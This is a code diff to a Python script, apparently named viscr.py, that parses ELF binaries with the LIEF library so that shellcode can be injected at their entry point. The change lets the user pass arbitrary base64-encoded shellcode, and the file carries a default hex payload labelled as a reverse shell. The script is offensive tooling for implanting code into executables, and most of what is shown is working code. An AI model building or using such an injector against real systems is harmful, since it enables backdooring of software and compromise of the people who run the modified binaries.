@@ -5,6 +5,7 @@ from sys import argv
 import struct
 import lief
 from textwrap import dedent
+import base64
 
 
 #rev shell
@@ -13,18 +14,13 @@ from textwrap import dedent
 payload = b"\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6"
 
 if len(argv) < 2:
-    print('Usage: viscr.py <binary> \n For now, put your shellcode into script itself')
+    print('Usage: viscr.py <binary> <b64 encoded shellcode>')
     exit(1)
-"""
-TODO: make argv shellcode acceptable  
-
 elif len(argv) == 3:
     print("Using user supplied shellcode")
-    print(fsencode(argvb))
-    payload = fsencode(argvb)
+    payload = base64.b64decode(argv[2])
 else:
     print("No shellcode provided. Using default and harmless")
-"""
 
 e = lief.ELF.parse(argv[1])
 og_entry = e.header.entrypoint
